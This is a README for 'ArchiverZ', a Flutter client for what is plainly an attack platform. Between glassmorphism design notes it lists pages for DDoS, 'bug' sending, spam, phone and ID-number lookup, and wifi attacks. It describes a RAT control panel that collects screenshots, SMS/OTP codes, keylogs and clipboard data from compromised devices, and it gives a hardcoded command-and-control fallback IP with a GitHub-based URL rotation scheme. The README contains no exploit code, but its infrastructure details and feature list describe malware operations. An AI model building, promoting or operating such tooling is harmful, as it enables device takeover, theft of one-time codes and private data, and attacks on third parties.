# ArchiverZ

**Vanguard Archive System** · v4.0.0

Flutter client for the ArchiverZ platform. **Futuristic glassmorphism
with vivid cyan + purple theme**, Tendou Kei (Blue Archive) mascot,
skippable splash videos, deep-space gradient design language, and
integrated RAT Control Panel.

## Branding

| Item              | Value                          |
|-------------------|--------------------------------|
| App name          | ArchiverZ                      |
| Channel (TG)      | @ArchiveXTeam                  |
| Developer (TG)    | @pixzarchive                   |
| Mascot            | Tendou Kei (Blue Archive)      |
| Package (Android) | com.archiverz.app              |
| Backend port      | 2000 (PPL API)                 |

## Design System v2 — Cyan + Purple Vivid

- **Palette:** deep space bg `#050818`, neon cyan `#00F0FF`, neon purple
  `#B14CFF`, neon pink `#FF3CAC`
- **Signature gradient:** cyan → purple diagonal (used for buttons, hero
  text, brand mark rings, stat highlights)
- **Glass cards:** frosted blur + thin neon border, optional cyan edge glow
- **Glow buttons:** cyan-purple gradient fill + neon glow shadow
- **Particles:** multi-color floating dots (cyan, purple, pink) on every screen
- **Corner glows:** ambient cyan + purple radial gradients in background

## Pages redesigned

- `splash_page.dart` — video splash + glassmorphism SKIP + pulsing brand mark
- `post_login_splash.dart` — NEW: shows after login, before dashboard
- `login_page.dart` — glass card form, glow buttons, Tendou Kei hero
- `loader_page.dart` (dashboard) — animated background + glass nav bar
- `home_page.dart` (attack page) — themed with cyan accent
- `admin_page.dart`, `seller_page.dart`, `change_password_page.dart`
- `buy_account.dart`, `chat_page.dart`, `chat_ai_page.dart`
- `nik_check_page.dart`, `ddos_page.dart`, `ddos_panel.dart`
- `bug_group.dart`, `custom_bug.dart`, `sender_page.dart`
- `manage_server.dart`, `subdomain_page.dart`, `subdomain_finder_page.dart`
- `wifi_internal.dart`, `wifi_external.dart`, `phone_lookup.dart`, `spam_ngl.dart`
- `telegram.dart`, `anime.dart`
- `rat_control_panel.dart` — RAT control panel (5 tabs)

## Splash flow

1. **App start** → splash video (skippable) → login page
2. **Login success** → PostLoginSplash (cyan-purple glassmorphism, 2.5s, tap to skip)
3. PostLoginSplash → Dashboard

## Bug execute (attack page)

Previously showed a video splash dialog when a bug was sent. **Removed.**
Now shows a simple SnackBar confirmation with check icon.

## Configuration

All branding, base URL, channels, mascot assets, and feature flags live in:

```
lib/config/app_config.dart
```

The API client at `lib/config/api.dart` loads the live baseUrl from
GitHub remote config (5-min refresh, cache survives restart).

## Auto-Reconnect

3-tier fallback:
1. Live URL from `https://raw.githubusercontent.com/pixzdev/ArchiverZ/main/x.json`
2. Cached URL from SharedPreferences
3. Hardcoded `fallbackBaseUrl` (`http://206.189.159.247:2000`)

When you change IP/domain, edit `x.json` on GitHub — all deployed apps
pick up the new URL within 5 minutes (no rebuild needed).

## RAT Control Panel

Open from dashboard drawer → "RAT Control Panel" (visible to owner,
developer, admin roles). 5 tabs:
- **Devices** — list RAT devices with summary counts
- **Console** — send WebSocket commands
- **Data** — view screenshots, SMS/OTP, keylog, clipboard, etc.
- **Mesh** — view mesh peer topology
- **Update** — set self-update metadata

## Build

```bash
flutter pub get
flutter build apk --release
# Output: build/app/outputs/flutter-apk/app-release.apk
```

© 2026 ArchiverZ · @ArchiveXTeam
